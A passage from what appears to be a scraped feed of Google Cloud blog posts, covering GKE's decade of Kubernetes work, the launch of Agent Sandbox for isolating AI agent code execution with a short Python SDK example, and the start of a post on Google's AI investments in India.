three-pronged approach:</span></p>\n<ol>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Elevate core Kubernetes OSS for next-gen workloads -</strong><span style=\"vertical-align: baseline;\"> This includes proactively supporting the agentic wave with our new Kubernetes-native AgentSandbox APIs for security, governance and isolation. Recently, we also added several capabilities to power inference workloads such as Inference Gateway API, and Inference Perf. In addition, capabilities such as Buffers API, and HPA help address provisioning latency from different angles for all workloads. </span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Provide GKE as the reference implementation for managed Kubernetes excellence -</strong><span style=\"vertical-align: baseline;\"> We continuously bring new features and best practices directly to GKE, translating our Kubernetes expertise into a fully managed, production-ready platform that integrates powerful Google Cloud services, and provides unmatched scale and security. We are excited to announce the new GKE Agent Sandbox, and we recently announced </span><a href=\"https://docs.cloud.google.com/kubernetes-engine/docs/concepts/about-compute-classes\"><span style=\"text-decoration: underline; vertical-align: baseline;\">GKE custom compute classes</span></a><span style=\"vertical-align: baseline;\">, </span><a href=\"https://cloud.google.com/blog/products/ai-machine-learning/gke-inference-gateway-and-quickstart-are-ga?e=48754805\"><span style=\"text-decoration: underline; vertical-align: baseline;\">GKE Inference Gateway</span></a><span style=\"vertical-align: baseline;\">, and </span><a href=\"https://cloud.google.com/kubernetes-engine/docs/how-to/machine-learning/inference/inference-quickstart\"><span style=\"text-decoration: underline; vertical-align: baseline;\">GKE Inference Quickstart</span></a><span style=\"vertical-align: baseline;\">. And to meet the demand for massive computation, we are pushing the limits of scale, with support for 130k node clusters.</span><span style=\"vertical-align: baseline;\"> </span><span style=\"vertical-align: baseline;\">This year, we’re also thrilled to announce our participation in the new </span><a href=\"https://www.cncf.io/blog/2025/08/01/help-us-build-the-kubernetes-conformance-for-ai/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">CNCF Kubernetes Kubernetes AI Conformance program</span></a><span style=\"vertical-align: baseline;\">, which simplifies AI/ML on Kubernetes with a standard for cluster interoperability and portability. GKE is already </span><a href=\"https://cloud.google.com/kubernetes-engine/docs/concepts/gke-ai-conformance\"><span style=\"text-decoration: underline; vertical-align: baseline;\">certified as an AI-conformant platform</span></a><span style=\"vertical-align: baseline;\">.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Drive frameworks and reduce operational friction -</strong><span style=\"vertical-align: baseline;\"> We actively collaborate with the open-source community and partners to enhance support for new frameworks, including Slurm and Ray on Kubernetes. We recently announced </span><a href=\"https://cloud.google.com/blog/products/containers-kubernetes/ray-on-gke-new-features-for-ai-scheduling-and-scaling?e=48754805\"><span style=\"text-decoration: underline; vertical-align: baseline;\">optimized open-source Ray for GKE</span></a><span style=\"vertical-align: baseline;\"> with <span style=\"vertical-align: baseline;\">Anyscale Platform and Runtime</span> in collaboration with Anyscale. More recently, we became a founding contributor to </span><a href=\"https://cloud.google.com/blog/products/ai-machine-learning/enhancing-vllm-for-distributed-inference-with-llm-d?e=48754805\"><span style=\"text-decoration: underline; vertical-align: baseline;\">llm-d</span></a><span style=\"vertical-align: baseline;\">, an open-source project in collaboration with partners to create a distributed, Kubernetes-native control plane for high-performance LLM inference at scale.</span></p>\n</li>\n</ol>\n<p><span style=\"vertical-align: baseline;\">Now let’s take a deeper look at the advancements. </span></p>\n<h3><strong style=\"vertical-align: baseline;\">Supporting the agentic wave</strong></h3>\n<p><span style=\"vertical-align: baseline;\">The Agentic AI wave is upon us. According to PwC, </span><span style=\"vertical-align: baseline;\">79%</span><span style=\"vertical-align: baseline;\"> of senior IT leaders are </span><a href=\"https://www.pwc.com/us/en/tech-effect/ai-analytics/ai-agent-survey.html\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">already adopting AI agents</span></a><span style=\"vertical-align: baseline;\">, and 88% plan to increase IT budgets in the next 12 months due to agentic AI. </span></p>\n<p><span style=\"vertical-align: baseline;\">Kubernetes already provides a robust foundation for deploying and managing agents at scale, yet the non-deterministic nature of agentic AI workloads introduces infrastructure challenges. Agents are increasingly capable of writing code, controlling computer interfaces and calling a myriad of tools, raising the stakes for isolation, efficiency, and governance. </span></p>\n<p><span style=\"vertical-align: baseline;\">We’re addressing these challenges by evolving Kubernetes’ foundational primitives while providing high performance and compute efficiency for agents running on GKE. Today, we announced </span><strong style=\"vertical-align: baseline;\">Agent Sandbox</strong><span style=\"vertical-align: baseline;\">, a new set of capabilities for Kubernetes-native agent code execution and computer use environments, available in preview. Designed as open source from the get-go, Agent Sandbox relies on gVisor to isolate agent environments, so you can confidently execute LLM-generated code and interact with your AI agents.</span></p>\n<p><span style=\"vertical-align: baseline;\">For an even more secure and efficient managed experience, the new </span><strong style=\"vertical-align: baseline;\">GKE Agent Sandbox</strong><span style=\"vertical-align: baseline;\"> enhances this foundation with built-in capabilities such as integrated sandbox snapshots and container-optimized compute. Agent Sandbox delivers sub-second latency for fully isolated agent workloads, up to a 90% improvement over cold starts. For more details, please refer to this detailed announcement on </span><a href=\"https://cloud.google.com/blog/products/containers-kubernetes/agentic-ai-on-kubernetes-and-gke\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Supercharging Agents on GKE</span></a><span style=\"vertical-align: baseline;\"> today. </span></p>\n<h3><strong style=\"vertical-align: baseline;\">Unmatched scale for the AI gigawatt era</strong></h3>\n<p><span style=\"vertical-align: baseline;\">In this ‘Gigawatt AI era,’ foundational model creators are driving demand for unprecedented computational power. Based on internal testing of our experimental-mode stack, we are excited to share that we used GKE to create the largest known Kubernetes cluster, with 130,000 nodes.</span></p>\n<p><span style=\"vertical-align: baseline;\">At Google Cloud, we’re also focusing on single-cluster scalability for tightly coupled jobs, developing multi-cluster orchestration capabilities for job sharding (e.g., </span><a href=\"https://kueue.sigs.k8s.io/docs/concepts/multikueue/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">MultiKueue</span></a><span style=\"vertical-align: baseline;\">), and designing new approaches for dynamic capacity reallocation — all while extending open-source Kubernetes APIs to simplify AI platform development and scaling. We are heavily investing into the open-source ecosystem of tools behind AI at scale (e.g. </span><a href=\"https://kueue.sigs.k8s.io/docs/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Kueue</span></a><span style=\"vertical-align: baseline;\">, </span><a href=\"https://github.com/kubernetes-sigs/jobset\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">JobSet</span></a><span style=\"vertical-align: baseline;\">, </span><a href=\"https://github.com/etcd-io/etcd\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">etcd</span></a><span style=\"vertical-align: baseline;\">), while making GKE-specific integrations to our data centers to offer the best performance and reliability (e.g., running the GKE control plane on Spanner). Finally, we’re excited to open-source our </span><span style=\"vertical-align: baseline;\">Multi-Tier Checkpointing (MTC) solution, designed to improve the efficiency of large-scale AI training jobs by reducing lost time associated with hardware failures and slow recovery from saved checkpoints.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">Better compute for every workload</strong></h3>\n<p><span style=\"vertical-align: baseline;\">Our decade-long commitment to Kubernetes is rooted in making it more accessible and efficient for every workload. However, through the years, one key challenge has remained: when using autoscaling, provisioning new nodes took several minutes — not fast enough for high-volume, fast-scale applications. This year, we addressed this friction head-on, with a variety of enhancements in support of our mission: to provide near-real-time scalable compute capacity precisely when you need it, all while optimizing price and performance. </span></p>\n<p><strong style=\"vertical-align: baseline;\">Autopilot for everyone</strong></p>\n<p><span style=\"vertical-align: baseline;\">We introduced the </span><a href=\"https://cloud.google.com/blog/products/containers-kubernetes/container-optimized-compute-delivers-autoscaling-for-autopilot?e=48754805\"><span style=\"text-decoration: underline; vertical-align: baseline;\">container-optimized compute platform</span></a><span style=\"vertical-align: baseline;\"> — a completely reimagined autoscaling stack for GKE Autopilot. As the recommended mode of operation, Autopilot fully automates your node infrastructure management and scaling, with dramatic performance and cost implications.  As Jia Li, co-founder at LiveX AI shared, \"LiveX AI achieves over 50% lower TCO, 25% faster time-to-market, and 66% lower operational cost with GKE Autopilot.” And with the recent GA of </span><a href=\"https://cloud.google.com/blog/products/containers-kubernetes/gke-autopilot-now-available-to-all-qualifying-clusters?e=4875480\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Autopilot compute classes for Standard clusters</span></a><span style=\"vertical-align: baseline;\">, we made this hands-off experience accessible to more developers, allowing you to adopt Autopilot on a per-workload basis.</span></p>\n<p><strong style=\"vertical-align: baseline;\">Tackling provisioning latency from every angle</strong></p>\n<p><span style=\"vertical-align: baseline;\">We introduced </span><strong style=\"vertical-align: baseline;\">faster concurrent node pool auto-provisioning</strong><span style=\"vertical-align: baseline;\">, making operations asynchronous and highly parallelized. This simple change dramatically accelerates cluster scaling for heterogeneous workloads, improving deployment latency many times over in our benchmarks. Then, for demanding scale-up needs, the new </span><a href=\"https://github.com/kubernetes/autoscaler/pull/8151/commits/0ffe04d1136f50eed0be6cd7910701bf3bacedcb?short_path=8ea88c4\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">GKE Buffers API (OSS)</span></a><span style=\"vertical-align: baseline;\"> allows you to request a buffer of pre-provisioned, ready-to-use nodes, making compute capacity available almost instantaneously. And once the node is ready, the new version of </span><a href=\"https://cloud.google.com/blog/products/containers-kubernetes/improving-gke-container-image-streaming-for-faster-app-startup?e=48754805\"><span style=\"text-decoration: underline; vertical-align: baseline;\">GKE container image streaming</span></a><span style=\"vertical-align: baseline;\"> gets your applications running faster by allowing them to start </span><span style=\"font-style: italic; vertical-align: baseline;\">before</span><span style=\"vertical-align: baseline;\"> the entire container image is downloaded, a critical boost for large AI/ML and data-processing workloads.</span></p>\n<p><strong style=\"vertical-align: baseline;\">Non-disruptive autoscaling to improve resource utilization</strong></p>\n<p><span style=\"vertical-align: baseline;\">The quest for speed extends to workload-level scaling. </span></p>\n<ol>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">The </span><a href=\"https://cloud.google.com/kubernetes-engine/docs/how-to/horizontal-pod-autoscaling#hpa-profile\"><span style=\"text-decoration: underline; vertical-align: baseline;\">HPA Performance Profile is now enabled by default</span></a><span style=\"vertical-align: baseline;\"> on new GKE Standard clusters. This brings massive scaling improvements — including support for up to 5,000 HPA objects and parallel processing — for faster, more consistent horizontal scaling. </span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">We're tackling disruptions in vertical scaling with the preview of </span><a href=\"https://github.com/kubernetes/autoscaler/tree/master/vertical-pod-autoscaler/enhancements/4016-in-place-updates-support\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">VPA with in-place pod resize</span></a><span style=\"vertical-align: baseline;\">, which allows GKE to automatically resize CPU and memory requests for your containers, often without needing to recreate the pod. </span></p>\n</li>\n</ol>\n<p><strong style=\"vertical-align: baseline;\">Dynamic hardware efficiency</strong></p>\n<p><span style=\"vertical-align: baseline;\">Finally, our commitment to dynamic efficiency extends to hardware utilization. GKE users now have access to:</span></p>\n<ol>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">New </span><strong style=\"vertical-align: baseline;\">N4A VMs</strong><span style=\"vertical-align: baseline;\"> based on Google Axion Processors (</span><a href=\"https://cloud.google.com/blog/products/compute/axion-based-n4a-vms-now-in-preview?e=48754805\"><span style=\"text-decoration: underline; vertical-align: baseline;\">now in preview</span></a><span style=\"vertical-align: baseline;\">) and </span><strong style=\"vertical-align: baseline;\">N4D VMs</strong><span style=\"vertical-align: baseline;\"> based on 5th Gen AMD EPYC Processors (</span><a href=\"https://cloud.google.com/blog/products/compute/n4d-vms-based-on-amd-turin-now-ga\"><span style=\"text-decoration: underline; vertical-align: baseline;\">now GA</span></a><span style=\"vertical-align: baseline;\">). Both support Custom Machine Types (CMT), letting you create right-sized nodes that are matched to your workloads. </span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">New </span><a href=\"https://cloud.google.com/blog/products/compute/adopt-new-vm-series-with-gke-compute-classes-flexible-cuds?e=48754805\"><span style=\"text-decoration: underline; vertical-align: baseline;\">GKE custom compute classes</span></a><span style=\"vertical-align: baseline;\">, allowing you to define a prioritized list of VM instance types, so your workloads automatically use the newest, most price-performant options with no manual intervention. </span></p>\n</li>\n</ol>\n<h3><strong style=\"vertical-align: baseline;\">A platform to power AI Inference</strong></h3>\n<p><span style=\"vertical-align: baseline;\">The true challenge of generative AI inference is how to serve billions of tokens reliably, at lightning speed, and without bankrupting the organization? </span></p>\n<p><span style=\"vertical-align: baseline;\">Unlike web applications, serving LLMs is both stateful and computationally intensive. </span><span style=\"vertical-align: baseline;\">To address this we have driven extensive open-source investments to Kubernetes including the </span><a href=\"https://github.com/kubernetes-sigs/gateway-api-inference-extension\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Gateway API Inference Extension</span></a><span style=\"vertical-align: baseline;\"> for LLM-aware routing, the </span><a href=\"https://github.com/kubernetes-sigs/inference-perf\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">inference performance project</span></a><span style=\"vertical-align: baseline;\">, providing a benchmarking standard for meticulous model performance insights on accelerators and HPA scaling metrics and thresholds, and </span><a href=\"https://kubernetes.io/docs/concepts/scheduling-eviction/dynamic-resource-allocation/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Dynamic Resource Allocation</span></a><span style=\"vertical-align: baseline;\"> (developed in collaboration with Intel and others) to streamline and automate the allocation and scheduling of GPUs, TPUs, and other devices to pods and workloads within Kubernetes. And we formed the </span><a href=\"https://cloud.google.com/blog/products/ai-machine-learning/enhancing-vllm-for-distributed-inference-with-llm-d?e=48754805\"><span style=\"text-decoration: underline; vertical-align: baseline;\">llm-d project</span></a><span style=\"vertical-align: baseline;\"> with Red Hat and IBM to create a Kubernetes-native distributed inference stack that optimizes for the “time to reach SOTA architectures.” </span></p>\n<p><span style=\"vertical-align: baseline;\">On the GKE side we recently announced the </span><a href=\"https://cloud.google.com/blog/products/ai-machine-learning/gke-inference-gateway-and-quickstart-are-ga?e=48754805\"><span style=\"text-decoration: underline; vertical-align: baseline;\">general availability of GKE Inference Gateway</span></a><span style=\"vertical-align: baseline;\">, a Kubernetes-native solution for serving AI workloads. It is available with two workload-specific optimizations:</span></p>\n<ol>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">LLM-aware routing</strong><span style=\"vertical-align: baseline;\"> for applications like multi-turn chat, which routes requests to the same accelerators to use cached context, avoiding latency spikes</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Disaggregated serving</strong><span style=\"vertical-align: baseline;\">, which separates the \"prefill\" (prompt processing) and \"decode\" (token generation) stages onto separate, optimized machine pools </span></p>\n</li>\n</ol>\n<p><span style=\"vertical-align: baseline;\">As a result, GKE Inference Gateway now achieves up to 96% lower Time-to-First-Token (TTFT) latency and up to 25% lower token costs at peak throughput when compared to other managed Kubernetes services.</span></p>\n<p><span style=\"vertical-align: baseline;\">Startup latency for AI inference servers is a consistent challenge with large models taking 10s of minutes to start. Today, we’re introducing </span><strong style=\"vertical-align: baseline;\">GKE Pod Snapshots</strong><span style=\"vertical-align: baseline;\"> which drastically improves startup latency by enabling CPU and GPU workloads to be restored from a memory snapshot.  GKE Pod Snapshots reduces AI inference start-up by as much as 80%, loading 70B parameter models in just 80 seconds and 8B parameters models in just 16 seconds.</span></p>\n<p><span style=\"vertical-align: baseline;\">No discussion of inference is complete without talking about </span><span style=\"vertical-align: baseline;\">the complexity, cost, and difficulty of deploying production-grade AI infrastructure. GKE Inference Quickstart provides a continuous, automated benchmarking system kept up to date with the latest accelerators in Google Cloud, the latest open models, and inference software. You can use these benchmarked profiles to save significant time qualifying, configuring, deploying, as well as monitoring</span><span style=\"vertical-align: baseline;\"> inference-specific performance metrics and dynamically fine-tuning your deployment. You can find this data in </span><a href=\"https://colab.sandbox.google.com/github/GoogleCloudPlatform/kubernetes-engine-samples/blob/main/ai-ml/notebooks/giq_visualizations.ipynb\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">this colab notebook</span></a><span style=\"vertical-align: baseline;\">. </span></p>\n<h3><strong style=\"vertical-align: baseline;\">Here’s to the next decade of Kubernetes and GKE</strong></h3>\n<p><span style=\"vertical-align: baseline;\"> As GKE celebrates a decade of foundational work, we at Google are proud to help lead the future, and we know it can only be built together. Kubernetes would not be where it is today without the efforts of its contributor community. That includes everyone from members writing foundational new features to those doing the essential, daily work — the \"chopping wood and carrying water\" — that keeps the project thriving.</span></p>\n<p><span style=\"vertical-align: baseline;\">We invite you to explore new capabilities, learn more about exciting announcements such as Ironwood TPUs, attend our deep-dive sessions, and join us in shaping the future of open-source infrastructure.</span></p></div>",
        "published_date": "2025-11-11 12:00:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/products/containers-kubernetes/agentic-ai-on-kubernetes-and-gke/",
        "title": "Introducing Agent Sandbox: Strong guardrails for agentic AI on Kubernetes and GKE",
        "thumbnail": null,
        "author": "Brandon Royal",
        "track": null,
        "description": "<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Google and the cloud-native community have consistently strengthened Kubernetes to support modern applications. At KubeCon EU 2025 earlier this year, </span><span style=\"vertical-align: baseline;\">we announced a series of enhancements</span><span style=\"vertical-align: baseline;\"> to Kubernetes </span><a href=\"https://cloud.google.com/blog/products/containers-kubernetes/google-bytedance-and-red-hat-improve-ai-on-kubernetes?e=48754805\"><span style=\"text-decoration: underline; vertical-align: baseline;\">to better support AI inference</span></a><span style=\"vertical-align: baseline;\">. Today, at KubeCon NA 2025, we’re focused on making Kubernetes the most open and scalable platform for AI agents, with the introduction of </span><strong style=\"vertical-align: baseline;\">Agent Sandbox</strong><span style=\"vertical-align: baseline;\">.</span></p>\n<p><span style=\"vertical-align: baseline;\">Consider the challenge that AI agents represent. AI agents help applications go from answering simple queries to performing complex, multi-step tasks to achieve the users objective. Provided a request like “visualize last quarters sales data”, the agent has to use one tool to query the data and another to process that data into a graph and return to the user.  Where traditional software is predictable, AI agents can make their own decisions about when and how to use tools at their disposal to achieve a user's objective, including generating code, using computer terminals and even browsers.</span></p>\n<p><span style=\"vertical-align: baseline;\">Without strong security and operational guardrails, orchestrating powerful, non-deterministic agents can introduce significant risks. Providing kernel-level isolation for agents that execute code and commands is non-negotiable. AI and agent-based workloads also have additional infrastructure needs compared to traditional applications. Most notably, they need to orchestrate thousands of sandboxes as ephemeral environments, rapidly creating and deleting them as needed while ensuring they have limited network access.  </span></p>\n<p><span style=\"vertical-align: baseline;\">With its maturity, security, and scalability, we believe Kubernetes provides the most suitable foundation for running AI agents. Yet it still needs to evolve to meet the needs of agent code execution and computer use scenarios. Agent Sandbox is a powerful first step in that direction. </span></p>\n<h3><strong style=\"vertical-align: baseline;\">Strong isolation at scale</strong></h3>\n<p><span style=\"vertical-align: baseline;\">Agentic code execution and computer use require an isolated sandbox to be provisioned for each task. Further, users expect infrastructure to keep pace even as thousands of sandboxes are scheduled in parallel. </span></p>\n<p><span style=\"vertical-align: baseline;\">At its core, </span><span style=\"vertical-align: baseline;\">Agent Sandbox is a new Kubernetes primitive built with the Kubernetes community that’s designed specifically for agent code execution and computer use, delivering the performance and scale needed for the next generation of agentic AI workloads. Foundationally built on gVisor with additional support for Kata Containers for runtime isolation, Agent Sandbox provides a secure boundary to reduce the risk of vulnerabilities that could lead to data loss, exfiltration or damage to production systems. We’re continuing our commitment to open source, building Agent Sandbox as a Cloud Native Computing Foundation (CNCF) project in the Kubernetes community. </span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"1\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/1_K1VZDUQ.max-1000x1000.jpg\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><h3><strong style=\"vertical-align: baseline;\">Enhanced performance on GKE</strong></h3>\n<p><span style=\"vertical-align: baseline;\">At the same time, you need to optimize performance as you scale your agents to deliver the best agent user-experience at the lowest cost. When you use Agent Sandbox on Google Kubernetes Engine (GKE), you can leverage managed gVisor in </span><a href=\"https://docs.cloud.google.com/kubernetes-engine/docs/concepts/sandbox-pods\"><span style=\"text-decoration: underline; vertical-align: baseline;\">GKE Sandbox</span></a><span style=\"vertical-align: baseline;\"> and the </span><a href=\"https://cloud.google.com/blog/products/containers-kubernetes/container-optimized-compute-delivers-autoscaling-for-autopilot?e=48754805\"><span style=\"text-decoration: underline; vertical-align: baseline;\">container-optimized compute platform</span></a><span style=\"vertical-align: baseline;\"> to horizontally scale your sandboxes faster. Agent Sandbox also enables low-latency sandbox execution by enabling administrators to configure pre-warmed pools of sandboxes. With this feature, Agent Sandbox delivers sub-second latency for fully isolated agent workloads, up to a 90% improvement over cold starts.</span></p>\n<p><span style=\"vertical-align: baseline;\">The same isolation property that makes a sandbox safe, makes it more susceptible to compute underutilization. Reinitializing each sandbox environment with a script can be brittle and slow, and idle sandboxes often waste valuable compute cycles. In a perfect world, you could take a snapshot of running sandbox environments to start them from a specific state.</span></p>\n<p><strong style=\"vertical-align: baseline;\">Pod Snapshots</strong><span style=\"vertical-align: baseline;\"> is a new, GKE-exclusive feature that enables full checkpoint and restore of running pods. Pod Snapshots drastically reduces startup latency of agent and AI workloads. When combined with Agent Sandbox, Pod Snapshots lets teams provision sandbox environments from snapshots, so they can start up in seconds. GKE Pod Snapshots supports snapshot and restore of both CPU- and GPU-based workloads, bringing pod start times from minutes down to seconds. With Pod Snapshots, any idle sandbox can be snapshotted and suspended, saving significant compute cycles with little to no disruption for end-users.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"2\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/2_NJWlanH.max-1000x1000.jpg\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><h3><strong style=\"vertical-align: baseline;\">Built for AI engineers</strong></h3>\n<p><span style=\"vertical-align: baseline;\">Teams building today’s agentic AI or reinforcement learning (RL) systems should not have to be infrastructure experts. We built Agent Sandbox with AI engineers in mind, designing an API and Python SDK that lets them manage the lifecycle of their sandboxes, without worrying about the underlying infrastructure.  </span></p></div>\n<div class=\"block-code\"><dl>\n    <dt>code_block</dt>\n    <dd>&lt;ListValue: [StructValue([(&#x27;code&#x27;, &#x27;from agentic_sandbox import Sandbox\\r\\n\\r\\n# The SDK abstracts all YAML into a simple context manager \\r\\nwith Sandbox(template_name=&quot;python3-template&quot;,namespace=&quot;ai-agents&quot;) as sandbox:\\r\\n\\r\\n   # Execute a command inside the sandbox\\r\\n   result = sandbox.run(&quot;print(\\&#x27;Hello from inside the sandbox!\\&#x27;)&quot;)&#x27;), (&#x27;language&#x27;, &#x27;&#x27;), (&#x27;caption&#x27;, &lt;wagtail.rich_text.RichText object at 0x7f93af942c40&gt;)])]&gt;</dd>\n</dl></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">This separation of concern enables both an AI developer-friendly experience and the operational control and extensibility that Kubernetes administrators and operators expect.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">Get started today</strong></h3>\n<p><span style=\"vertical-align: baseline;\">Agentic AI represents a profound shift for software development and infrastructure teams. Agent Sandbox and GKE can help  deliver the isolation and performance your agents need. </span><span style=\"vertical-align: baseline;\">Agent Sandbox is available in open source and can be </span><span style=\"vertical-align: baseline;\">deployed on GKE today</span><span style=\"vertical-align: baseline;\">. GKE Pod Snapshots is available in limited preview and will be available to all GKE customers later this year. To get started, check out the Agent Sandbox </span><a href=\"https://agent-sandbox.sigs.k8s.io/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">documentation</span></a><span style=\"vertical-align: baseline;\">  and </span><a href=\"https://docs.cloud.google.com/kubernetes-engine/docs/how-to/agent-sandbox\"><span style=\"text-decoration: underline; vertical-align: baseline;\">quick start</span></a><span style=\"vertical-align: baseline;\">. We are excited to see what you build!</span></p></div>",
        "published_date": "2025-11-11 12:00:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/products/gcp/supporting-viksit-bharat-announcing-ai-investments-in-india/",
        "title": "Supporting Viksit Bharat: Announcing our newest AI investments in India",
        "thumbnail": null,
        "author": "Saurabh Tiwary",
        "track": null,
        "description": "<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">India’s developer community, vibrant startup ecosystem, and leading enterprises are embracing AI with incredible speed. To meet this moment for India, we are investing in powerful, locally-available tools in India that can help foster a diverse ecosystem, and ensure our platform delivers the controls you need for compliance and AI sovereignty.</span></p>\n<p><span style=\"vertical-align: baseline;\">Today, we’re announcing a significant expansion of our local AI hardware capacity for customers in India. This increase in local compute, powered by Google's </span><a href=\"https://cloud.google.com/blog/products/compute/in-q3-2025-ai-hypercomputer-adds-vllm-tpu-and-more\"><span style=\"text-decoration: underline; vertical-align: baseline;\">AI Hypercomputer architecture</span></a><span style=\"vertical-align: baseline;\"> with the latest Trillium TPUs, will help more businesses and public sector organizations train and serve their most advanced Gemini models in India. </span></p>\n<p><span style=\"vertical-align: baseline;\">By unblocking new opportunities for high-performance, low-latency AI applications we can help customers meet India’s data residency and sovereignty requirements.</span></p>\n<h3 style=\"text-align: justify;\"><strong style=\"vertical-align: baseline;\">Enabling models and control: AI tools built for India's context</strong></h3>\n<p><span style=\"vertical-align: baseline;\">While infrastructure is the foundation for digital sovereignty, it also requires control over the data and the models built on it. We’re committed to bringing our latest AI advancements to India faster than ever, with the controls you need.</span></p>\n<p><span style=\"vertical-align: baseline;\">Our new services would enable you to build, tune, and deploy models that understand India's unique business logic and rich cultural context.</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Next-generation models, here in India</strong><span style=\"vertical-align: baseline;\">: Earlier this year, Google Cloud made Gemini available to regulated Indian customers by deploying Gemini 2.5 Flash with local machine-learning processing support. Now, we’re opening early testing for our latest and most advanced Gemini models to Indian customers. We’re also committing to launching the most powerful Gemini models in India with full data residency support. This is a first for Google Cloud, and a direct response to help meet the needs of our Indian customers.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">More AI capabilities, available locally</strong><span style=\"vertical-align: baseline;\">: We’re providing additional consumption models and pre-built AI-powered applications tailored for local context by launching a suite of new capabilities with data residency support in India:</span></p>\n</li>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Batch support for Gemini 2.5 Flash</strong><span style=\"vertical-align: baseline;\">: Now generally available, this allows organizations to run high-volume, non-real-time AI tasks at a lower cost, all in India.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Document AI</strong><span style=\"vertical-align: baseline;\">: Now in preview, we’re providing local support to help Indian businesses automate document processing.</span></p>\n</li>\n</ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">More local context in your AI</strong><span style=\"vertical-align: baseline;\">: </span><a href=\"https://docs.cloud.google.com/vertex-ai/generative-ai/docs/grounding/grounding-with-google-maps\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Grounding on Google Maps</span></a><span style=\"vertical-align: baseline;\"> is a new capability to ground model responses in real time from Google Maps, ensuring AI applications can provide accurate, location-aware answers.</span></p>\n</li>\n</ul>\n<h3><strong style=\"vertical-align: baseline;\">A sovereign AI ecosystem: Building for India, with India</strong></h3>\n<p><span style=\"vertical-align: baseline;\">The most durable and decisive factor for long-term digital sovereignty lies in cultivating the \"human element\" — the skilled talent and innovation ecosystem. A sovereign AI future depends on building a strong local ecosystem.</span></p>\n<p><span style=\"vertical-align: baseline;\">Our strategy is to support India’s ecosystem-led approach by investing in the researchers, developers, and startups who are building for India's specific needs.</span></p>\n<p><strong style=\"vertical-align: baseline;\">Collaboration with IIT Madras</strong><span style=\"vertical-align: baseline;\">: Google Cloud and Google DeepMind are thrilled to collaborate with IIT Madras to support the launch of </span><a href=\"https://arena.ai4bharat.org/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Indic Arena</span></a><span style=\"vertical-align: baseline;\">. Run independently by the renowned AI4Bharat center at IIT Madras, this platform will allow users from all over India to anonymously evaluate and rank AI models on tasks unique to India's rich multilingual landscape. To support this initiative, we are providing cloud credits to power this critical, community-driven resource.</span></p>\n<p><span style=\"vertical-align: baseline;\">\"At AI4Bharat, our mission is to build AI for India's specific needs. A critical part of this is having a neutral, standardized benchmark to understand how models are performing across our many languages,” said Mitesh 